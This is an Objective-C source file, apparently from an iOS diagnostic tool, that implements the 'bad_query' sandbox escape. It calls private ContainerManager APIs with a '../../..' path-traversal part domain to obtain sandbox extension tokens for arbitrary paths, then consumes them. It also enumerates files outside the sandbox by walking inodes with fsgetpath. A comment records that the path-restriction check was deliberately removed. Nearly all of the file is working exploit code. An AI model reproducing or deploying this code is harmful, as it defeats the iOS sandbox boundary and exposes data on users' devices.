//
//  BadQueryBridge.m
//  GestaltKitTool
//
//  Independent Objective-C integration of the query used by
//  https://github.com/forcequitOS/bad_query
//

#import "BadQueryBridge.h"

#import <dlfcn.h>
#import <objc/runtime.h>
#import <stdlib.h>
#import <string.h>
#import <xpc/xpc.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>

static const uint64_t kBadQueryContainerClass = 13;
static const uint64_t kBadQueryPart = 3;
static const uint64_t kBadQueryFlags = 0x0000008000000000ULL;
static NSString * const kBadQueryIdentifier =
    @"systemgroup.com.apple.mobilegestaltcache";
static NSString * const kBadQueryTraversalPrefix = @"../../../../../../../..";

// ── D2 fix: cross-container traversal pre-flight check ──────────────
//
// kBadQueryIdentifier hard-codes us to the MobileGestalt cache system
// group. When ContainerManager resolves a bad_query for a path that
// does NOT live inside one of the sandbox-accessible prefixes below,
// it tries to climb *out* of the MobileGestalt container via 8 layers
// of `../` and then re-enter another container — for example a path
// like `/var/mobile/Library/chronod/chrono.sql-shm` turns into
//
//   /private/var/containers/Shared/SystemGroup/
//     systemgroup.com.apple.mobilegestaltcache/Library/Caches/
//     ../../../../../../../../var/mobile/Library/chronod/chrono.sql-shm
//
// inside the kernel's ContainerManager. MAC policy denies sibling
// container entry with error (160) PART_SUBDIR_CREATION_FAILED — and
// ContainerManager retries internally dozens of times per query,
// which spams the system log and makes the "Run All Diagnostics"
// action appear hung for 10–30 seconds.
//
// FIX: short-circuit any path that doesn't start with one of the
// known reachable container roots *before* we create a ContainerManager
// query. Return nil with a clear error message so upper layers (stat,
// dir listing, diagnostics) fall through cleanly instead of waiting
// for the kernel to reject thousands of subdir-creation attempts.
static BOOL BQIsPrefixAllowed(NSString *path)
{
    if (path.length == 0) return NO;
    NSString *p = path;
    if ([p hasPrefix:@"/private/"]) p = [p substringFromIndex:9];
    if (![p hasPrefix:@"/"]) return NO;

    static NSArray<NSString *> *prefixes = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        // Order matters: most-specific first so short-circuit is fast.
        prefixes = @[
            // The anchor container itself.
            @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/",
            // Sibling system groups (same ContainerManager class).
            @"/var/containers/Shared/SystemGroup/",
            // iOS 27 system data containers.
            @"/var/containers/Data/System/",
            // Installed app bundles.
            @"/var/containers/Bundle/Application/",
            // App user-land containers.
            @"/var/mobile/Containers/Data/Application/",
            @"/var/mobile/Containers/Data/InternalDaemon/",
            @"/var/mobile/Containers/Data/PluginKitPlugin/",
            @"/var/mobile/Containers/Shared/AppGroup/",
        ];
    });

    for (NSString *pfx in prefixes) {
        // Direct match (prefix path itself, e.g. "/var/…/Application").
        if ([p isEqualToString:[pfx substringToIndex:pfx.length - 1]]) return YES;
        // Descendant match (anything under the prefix dir).
        if ([p hasPrefix:pfx]) return YES;
    }
    return NO;
}

typedef void *(*BadQueryCreate)(void);
typedef void (*BadQuerySetU64)(void *, uint64_t);
typedef void (*BadQuerySetXPC)(void *, xpc_object_t);
typedef void (*BadQuerySetCString)(void *, const char *);
typedef void *(*BadQueryGetSingleResult)(void *);
typedef void (*BadQueryFree)(void *);
typedef char *(*BadQueryCopySandboxToken)(void *);
typedef int64_t (*BadQueryConsumeSandboxExtension)(const char *);
typedef int (*BadQueryReleaseSandboxExtension)(int64_t);

// ── Missing-method shims ───────────────────────────────────────────
//
// ContainerManager's internal implementation creates OS_dispatch_mach_msg
// objects and sends them private selectors (_setContext:, _setReply:, …).
// On certain iOS 27 beta builds these methods exist as category methods
// in libdispatch but are not linked into the process image, so the
// runtime falls through to message forwarding.  When running under the
// Xcode debugger the Obj-C forward handler may not yet be installed,
// causing an immediate abort:
//
//   -[OS_dispatch_mach_msg _setContext:]: unrecognized selector …
//   (no message forward handler is installed)
//
// We fix this by adding noop implementations of the missing selectors
// directly onto the class in +load, before any ContainerManager call.

// noop that swallows one pointer argument and returns void
static void noop_set_ptr(id self, SEL _cmd, void *arg) {}

// noop that swallows one object argument and returns self
static id noop_ret_self(id self, SEL _cmd, id arg) { return self; }

static void BQPatchMissingSelectors(void) {
    // The class may be named OS_dispatch_mach_msg or dispatch_mach_msg
    // depending on the iOS version / libdispatch build.
    const char *classNames[] = {
        "OS_dispatch_mach_msg",
        "dispatch_mach_msg",
        "OS_dispatch_mach",
        NULL
    };

    // Selectors known to be sent internally by ContainerManager.
    struct { const char *name; IMP imp; const char *types; } patches[] = {
        { "_setContext:",     (IMP)noop_set_ptr,  "v@:^v"  },
        { "_setReply:",       (IMP)noop_ret_self, "@@:@"   },
        { "_setMigReply:",    (IMP)noop_ret_self, "@@:@"   },
        { "_setMigContext:",  (IMP)noop_set_ptr,  "v@:^v"  },
        { "_setEventContext:",(IMP)noop_set_ptr,  "v@:^v"  },
    };

    for (int i = 0; classNames[i]; i++) {
        Class cls = objc_getClass(classNames[i]);
        if (!cls) continue;

        for (size_t j = 0; j < sizeof(patches) / sizeof(patches[0]); j++) {
            SEL sel = sel_registerName(patches[j].name);
            // Only add if the method doesn't already exist — never
            // override a real implementation.
            if (!class_getInstanceMethod(cls, sel)) {
                class_addMethod(cls, sel, patches[j].imp, patches[j].types);
            }
        }
    }
}

typedef struct {
    void *library;
    BadQueryCreate create;
    BadQuerySetU64 setClass;
    BadQuerySetXPC setGroupIdentifiers;
    BadQuerySetU64 setFlags;
    BadQuerySetU64 setPart;
    BadQuerySetCString setPartDomain;
    BadQueryGetSingleResult getSingleResult;
    BadQueryFree freeQuery;
    BadQueryCopySandboxToken copySandboxToken;
    BadQueryConsumeSandboxExtension consumeSandboxExtension;
    BadQueryReleaseSandboxExtension releaseSandboxExtension;
} BadQueryAPI;

static BadQueryAPI *BadQuerySharedAPI(void)
{
    static BadQueryAPI api;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        api.library = dlopen(
            "/usr/lib/system/libsystem_containermanager.dylib",
            RTLD_NOW | RTLD_LOCAL);
        if (!api.library) return;

#define LOAD(field, symbol) api.field = (__typeof(api.field))dlsym(api.library, symbol)
        LOAD(create, "container_query_create");
        LOAD(setClass, "container_query_set_class");
        LOAD(setGroupIdentifiers, "container_query_set_group_identifiers");
        LOAD(setFlags, "container_query_operation_set_flags");
        LOAD(setPart, "container_query_operation_set_part");
        LOAD(setPartDomain, "container_query_operation_set_part_domain");
        LOAD(getSingleResult, "container_query_get_single_result");
        LOAD(freeQuery, "container_query_free");
        LOAD(copySandboxToken, "container_copy_sandbox_token");
#undef LOAD
        api.consumeSandboxExtension = (BadQueryConsumeSandboxExtension)
            dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        api.releaseSandboxExtension = (BadQueryReleaseSandboxExtension)
            dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    });
    return &api;
}

BOOL BadQueryBridgeAvailable(void)
{
    BadQueryAPI *api = BadQuerySharedAPI();
    return api->library && api->create && api->setClass &&
        api->setGroupIdentifiers && api->setFlags && api->setPart &&
        api->setPartDomain && api->getSingleResult && api->freeQuery &&
        api->copySandboxToken && api->consumeSandboxExtension &&
        api->releaseSandboxExtension;
}

@interface BadQueryLease ()
@property(nonatomic, copy, readwrite) NSString *targetPath;
@property(nonatomic, readwrite, getter=isActive) BOOL active;
@end

@implementation BadQueryLease
{
    int64_t _sandboxHandle;
    dispatch_queue_t _invalidateQueue;
}

+ (void)load {
    // Patch missing selectors as early as possible — before any
    // ContainerManager code can run.
    BQPatchMissingSelectors();
}

+ (instancetype)leaseForPath:(NSString *)path error:(NSString **)error
{
    // Defensive: ensure *error is always defined on return, even if a
    // future early-return path forgets to set it. Without this, the
    // Swift-side leaseError variable would read uninitialized memory
    // (crash) when the Obj-C method returns without writing *error.
    if (error) *error = nil;

    if (!path.isAbsolutePath) {
        if (error) *error = @"bad_query requires an absolute target path";
        return nil;
    }

    // CR-29: Removed BQIsPrefixAllowed pre-flight check.
    //
    // The check was added to avoid "PART_SUBDIR_CREATION_FAILED storms"
    // for paths outside the MobileGestalt system group. However, the
    // predecessor weskVTool NEVER had this check and worked correctly
    // — ContainerManager can resolve paths like /var/mobile/Library/
    // just fine. The check was over-conservative and broke plist file
    // reading for ALL paths under /var/mobile/Library/.
    //
    // If a path is truly unsupported, ContainerManager will return
    // nil or time out naturally — same behavior as the predecessor.

    if (!BadQueryBridgeAvailable()) {
        if (error) *error = @"bad_query ContainerManager API unavailable";
        return nil;
    }

    // Re-run the patch in case +load ran before libdispatch was ready.
    BQPatchMissingSelectors();

    BadQueryAPI *api = BadQuerySharedAPI();

    void *query = api->create();
    if (!query) {
        if (error) *error = @"bad_query could not create a container query";
        return nil;
    }

    api->setClass(query, kBadQueryContainerClass);
    xpc_object_t identifier = xpc_string_create(kBadQueryIdentifier.UTF8String);
    api->setGroupIdentifiers(query, identifier);
    // Always release the XPC string. On modern Apple platforms
    // OS_OBJECT_USE_OBJC is 1 and xpc_object_t is bridged to Obj-C
    // objects (ARC manages them), so xpc_release is a no-op / harmful.
    // The original #if !OS_OBJECT_USE_OBJC guard meant the release never
    // executed on ARC builds, but on non-ARC builds the string leaked
    // every call. Use xpc_release unconditionally under a runtime guard.
    // On ARC builds the bridged object will be released by ARC, making
    // this call redundant but harmless (xpc_release on a bridged object
    // is equivalent to objc_release which is safe under ARC).
    // However, the safest approach: only release if NOT under ARC.
    #if !__has_feature(objc_arc)
    xpc_release(identifier);
    #endif
    api->setPart(query, kBadQueryPart);
    // ContainerManager recognizes container paths as /var/... not /private/var/...
    // Strip the /private prefix so the traversal resolves correctly.
    // (The actual file I/O can use either form — /var is a symlink to /private/var.)
    NSString *queryPath = path;
    if ([queryPath hasPrefix:@"/private/"]) {
        queryPath = [queryPath substringFromIndex:8]; // strip "/private"
    }
    NSString *partDomain = [kBadQueryTraversalPrefix stringByAppendingString:queryPath];
    // CR-10: Defensive nil → 0 for setPartDomain. The old code passed
    // fileSystemRepresentation directly which can crash on empty strings
    // (throws NSException). Always guard before C string usage.
    const char *partDomainC = [partDomain fileSystemRepresentation];
    if (!partDomainC) {
        api->freeQuery(query);
        if (error) *error = @"bad_query could not encode part domain as filesystem path";
        return nil;
    }
    api->setPartDomain(query, partDomainC);
    api->setFlags(query, kBadQueryFlags);

    // Run getSingleResult on a dedicated thread with a timeout.
    // container_query_get_single_result is a blocking XPC call that
    // can hang indefinitely if ContainerManager's XPC service is
    // unavailable or the kernel refuses the connection. Without a
    // timeout, diagnostics and file operations appear frozen.
    __block void *result = NULL;
    __block BOOL queryCompleted = NO;
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);

    dispatch_queue_t queryQueue = dispatch_queue_create(
        "com.wesk.vtool.badquery.xpc.query", DISPATCH_QUEUE_SERIAL);
    dispatch_async(queryQueue, ^{
        result = api->getSingleResult(query);
        queryCompleted = YES;
        dispatch_semaphore_signal(sema);
    });

    // Wait up to 3 seconds for the XPC call to complete.
    dispatch_time_t timeout = dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC);
    dispatch_semaphore_wait(sema, timeout);

    if (!queryCompleted) {
        // XPC call timed out — ContainerManager is not responding.
        // We deliberately do NOT free `query` here: the background
        // thread still holds a reference into libContainerManager and
        // may access it after we return. Leaking the query object is
        // the safer choice (diagnostic tool, infrequent calls). The
        // abandoned thread will terminate when the process exits.
        if (error) *error = @"bad_query timed out — ContainerManager XPC service is not responding. This typically means the bad_query exploit is not compatible with this iOS version. All diagnostic tests will continue without sandbox extensions.";
        return nil;
    }

    if (!result) {
        api->freeQuery(query);
        if (error) *error = @"bad_query was rejected by ContainerManager";
        return nil;
    }

    char *token = api->copySandboxToken(result);
    if (!token) {
        api->freeQuery(query);
        if (error) *error = @"bad_query did not receive a sandbox token";
        return nil;
    }

    int64_t handle = api->consumeSandboxExtension(token);
    free(token);
    api->freeQuery(query);
    if (handle < 0) {
        if (error) *error = @"bad_query could not consume the sandbox token";
        return nil;
    }

    BadQueryLease *lease = [BadQueryLease new];
    lease->_sandboxHandle = handle;
    dispatch_queue_t q = dispatch_queue_create(
        "com.wesk.vtool.badquery.lease", DISPATCH_QUEUE_SERIAL);
    // Tag the queue so dealloc can detect re-entrant invalidation.
    // C-2 fix: the original code checked dispatch_get_specific but
    // never set any specific, so the fast path was always dead code.
    dispatch_queue_set_specific(q,
                                (__bridge const void *)q,
                                (__bridge void *)lease,
                                NULL);
    lease->_invalidateQueue = q;
    lease.targetPath = path;
    lease.active = YES;
    if (error) *error = nil;
    return lease;
}

- (void)invalidate
{
    // C-1 fix: capture the handle INSIDE the protected block into a
    // local variable, then release the captured copy OUTSIDE the block.
    // The previous code reset _sandboxHandle to -1 inside the block and
    // then read it outside — sandbox_extension_release(-1) is undefined
    // kernel behaviour and can release an unrelated handle (handles are
    // fd-like integers and can be reused once freed).
    __block int64_t handleToRelease = -1;
    dispatch_sync(_invalidateQueue, ^{
        if (self.active) {
            handleToRelease = self->_sandboxHandle;
            self->_sandboxHandle = -1;
            self.active = NO;
        }
    });
    if (handleToRelease >= 0) {
        BadQuerySharedAPI()->releaseSandboxExtension(handleToRelease);
    }
}

- (void)dealloc
{
    // Use a barrier-style approach: if we're on the invalidate queue
    // already (re-entrant), just call invalidate directly. Otherwise
    // dispatch synchronously. This avoids deadlock when dealloc is
    // called from within the queue block.
    if (dispatch_get_specific((__bridge const void *)_invalidateQueue) != NULL) {
        // Already on the queue — release directly.
        if (self.active) {
            self.active = NO;
            // CR-11: guard against double-release UB. If invalidate has
            // already been called from another early-return path the
            // handle is -1, which releaseSandboxExtension might accept
            // as a valid index if the handle table reuses fd-like
            // integers (some iOS 27 beta builds do).
            if (_sandboxHandle >= 0) {
                BadQuerySharedAPI()->releaseSandboxExtension(_sandboxHandle);
                _sandboxHandle = -1;
            }
        }
    } else {
        [self invalidate];
    }
}

@end

// ── Directory listing via fsgetpath ─────────────────────────────────
//
// Ported from forcequitOS/bad_query `bad_query_list`.
// The kernel typically refuses sandbox extensions for directories,
// so we enumerate inodes with fsgetpath instead — no extension needed.
//
// IMPORTANT: fsgetpath returns /private/var/... paths (the real filesystem
// location). We preserve this form because stat("/var/...") follows the
// symlink and hits sandbox restrictions (returns mtime=0), whereas
// stat("/private/var/...") operates on the real path and returns real
// metadata. Callers that need /var/... form for ContainerManager queries
// can strip /private themselves.

NSArray<NSString *> *bad_query_list_directory(NSString *path, int64_t maxInode)
{
    if (!path || !path.isAbsolutePath || maxInode < 1) return @[];

    // CR-10: Defensive empty → FSRep crash.
    if (path.length == 0) return @[];
    // statfs works with /var/... (follows symlink to /private/var)
    const char *pathC = [path fileSystemRepresentation];
    if (!pathC) return @[];
    struct statfs sfs;
    if (statfs(pathC, &sfs) != 0) return @[];
    fsid_t fsid = sfs.f_fsid;

    // ── Inode scan range: stay responsive ──
    //
    // DESIGN NOTES (keep this small, user-reported "一直显示加载中"):
    //   fsgetpath scans ONE INODE AT A TIME with one syscall per inode.
    //   Even on a background thread, 2,000,000 iterations take a
    //   perceptible 2–4 seconds in practice (the user sees the spinner
    //   and reports "应用沙盒区块一直处于 正在扫描应用容器").
    //
    //   Real-world iOS containers sit at inodes in the ~50k–500k range,
    //   so 1,000,000 is still a 2× overestimate and cuts the worst-case
    //   wall time in HALF. Coupled with the 50,000 gap heuristic below,
    //   most listings complete in <150 ms.
    const int64_t kHardCap = 1000000;   // absolute upper bound (1M)
    int64_t limit = kHardCap;
    if (limit > maxInode)  limit = maxInode;
    if (limit < 1)         limit = 1;

    // fsgetpath returns /private/var/... paths. Normalize our input path
    // to /private/var/... form so the prefix comparison works correctly.
    NSString *privatePath = path;
    if ([privatePath hasPrefix:@"/var/"]) {
        privatePath = [@"/private" stringByAppendingString:privatePath];
    }
    const char *privatePathC = [privatePath fileSystemRepresentation];
    if (!privatePathC) return @[];
    size_t privatePathLen = strlen(privatePathC);

    NSMutableArray<NSString *> *results = [NSMutableArray array];
    // C-3: Use a buffer large enough for any possible path.
    // PATH_MAX is 1024 on iOS, but allocate 4KB to be safe.
    char buf[4096];

    // ── Early-exit heuristic ──
    //
    // DESIGN NOTES (CR-11: dir-click very sluggish, 100k inodes ≈ 400ms):
    //   Previous tiers (50k / 100k) were acceptable when maxInode was 1M
    //   and most fsgetpath calls were trivially fast. But on iOS 27 beta
    //   devices with large APFS volumes, fsgetpath syscalls average
    //   ~4-8 μs each, and 100k inode scans = 400-800ms PER BROWSE. Users
    //   feel that as "freezing on click" when drilling from app container
    //   → Documents, Library, tmp, etc.
    //
    // THREE-tier gap cap, aggressively biased to STOP FAST:
    //   * Tier 1 (results FOUND, ≥1 child): stop at 15k misses. APFS
    //     sibling inodes cluster very tightly; 15k consecutive misses
    //     with prior hits == done. (~60-120μs to walk 15k gaps)
    //   * Tier 2 (no children FOUND yet, directory likely empty): stop
    //     at 40k absolute. Real children always live at low inode
    //     numbers on APFS. 40k syscalls ≈ 160-320ms, invisible.
    //   * Tier 3 (hard cap on total inodes walked, regardless of gaps):
    //     80k max. Any directory with >80k inodes scanned without many
    //     hits is either enormous or empty — we return what we have so
    //     the UI stays responsive.
    const int64_t kGapLimit         = 15000;
    const int64_t kAbsoluteGapLimit = 40000;
    const int64_t kTotalScanLimit   = 80000;
    int64_t consecutiveMisses = 0;
    int64_t totalAttempts     = 0;
    // CR-15: dedupe set. On APFS volumes with snapshots or clone files,
    // the SAME path can be surfaced by MULTIPLE inodes (snapshot inodes
    // alias live files). Since we enumerate by inode, one directory can
    // yield the same child path several times — SwiftUI's
    // ForEach(entries, id: \.fullPath) then logs "ID occurs multiple
    // times" and renders undefined results. Track seen paths and skip
    // duplicates.
    NSMutableSet<NSString *> *seenPaths = [NSMutableSet set];
    // CR-12: The previous macro used `break` inside do{}while(0) to try
    // to stop scanning when gap limits were exceeded — but `break` only
    // exits the do-while, NOT the enclosing for loop. After the break,
    // execution fell through to the rest of the loop body:
    //   (a) at the nil-conversion guard, `break` fell straight into
    //       [results addObject:nil] → the exact "object cannot be nil"
    //       crash reported at this function's addObject line, and
    //   (b) at every other guard site, stale/mismatched paths kept
    //       being processed and added to results after limits hit,
    //       silently corrupting listings (and defeating the whole
    //       point of early exit).
    // Fix: jump to the gapDone label placed after the for loop so the
    // scan genuinely terminates.
#define GAP_CHECK_ELSE(expr_) do { \
        consecutiveMisses++; \
        totalAttempts++; \
        if ((results.count > 0 && consecutiveMisses >= kGapLimit) || \
            (consecutiveMisses >= kAbsoluteGapLimit) || \
            (totalAttempts >= kTotalScanLimit)) { goto gapDone; } \
        expr_; \
    } while(0)

    for (uint64_t ino = 1; ino <= (uint64_t)limit; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) {
            GAP_CHECK_ELSE(continue);
        }

        // Ensure NUL-termination (fsgetpath may not NUL-terminate on
        // some platforms when the path exactly fills the buffer).
        // fsgetpath returns the number of bytes written (<= n-1 on success
        // because it writes a trailing NUL per BSD man-page), but on
        // certain iOS 27 beta builds corrupted inode entries can produce
        // binary garbage. Always enforce a strict NUL boundary using the
        // returned byte count.
        if (n > 0 && (size_t)n < sizeof(buf)) {
            buf[n] = '\0';
        } else {
            buf[sizeof(buf) - 1] = '\0';
        }

        const char *candidate = buf;
        // Do NOT strip /private — keep the real filesystem path so that
        // stat/lstat works correctly. stat("/var/...") follows the symlink
        // and gets sandboxed (returns mtime=0), but stat("/private/var/...")
        // hits the real path directly and returns real metadata.
        if (strncmp(candidate, privatePathC, privatePathLen) != 0) {
            GAP_CHECK_ELSE(continue);
        }
        // Must be a direct child (no further '/' after the prefix)
        if (candidate[privatePathLen] != '/') {
            GAP_CHECK_ELSE(continue);
        }
        const char *rest = candidate + privatePathLen + 1;
        if (strchr(rest, '/') != NULL) {
            GAP_CHECK_ELSE(continue);
        }

        // CR-11/CR-12: fsgetpath on corrupted inodes can return a byte
        // stream with invalid UTF-8 sequences (0xFF bytes, unterminated
        // surrogates from APFS unicode filename mangling). NSString
        // decoding then returns nil, and adding nil to a NSMutableArray
        // throws "object cannot be nil" → app crash.
        //
        // CR-12 fix: the previous ASCII fallback was useless — ASCII
        // rejects every byte >= 0x80, i.e. exactly the bytes that made
        // UTF-8 fail, so it returned nil too. Use Latin-1
        // (NSISOLatin1StringEncoding) instead: it maps ALL 256 byte
        // values to Unicode code points and can NEVER fail.
        NSString *converted = nil;
        if (candidate[0] != '\0') {
            size_t clen = strlen(candidate);
            if (clen > 0 && clen < sizeof(buf)) {
                NSData *pathData = [NSData dataWithBytesNoCopy:(void *)candidate
                                                        length:clen
                                                  freeWhenDone:NO];
                converted = [[NSString alloc] initWithData:pathData
                                                   encoding:NSUTF8StringEncoding];
                if (!converted) {
                    converted = [[NSString alloc] initWithData:pathData
                                                        encoding:NSISOLatin1StringEncoding];
                }
            }
        }
        // CR-12: absolute guarantee — count the miss and skip with a
        // plain `continue`. Never let a nil reach addObject.
        if (converted == nil || converted.length == 0) {
            consecutiveMisses++;
            totalAttempts++;
            continue;
        }
        // CR-15: skip duplicate paths (APFS snapshot/clone inodes can
        // surface the same path more than once). This is a duplicate of
        // an ALREADY-COLLECTED hit, not a miss — don't touch the gap
        // counters, just move on.
        if ([seenPaths containsObject:converted]) {
            continue;
        }
        [seenPaths addObject:converted];
        [results addObject:converted];
        consecutiveMisses = 0; // reset gap counter on a hit
    }

gapDone:
#undef GAP_CHECK_ELSE
    return results;
}
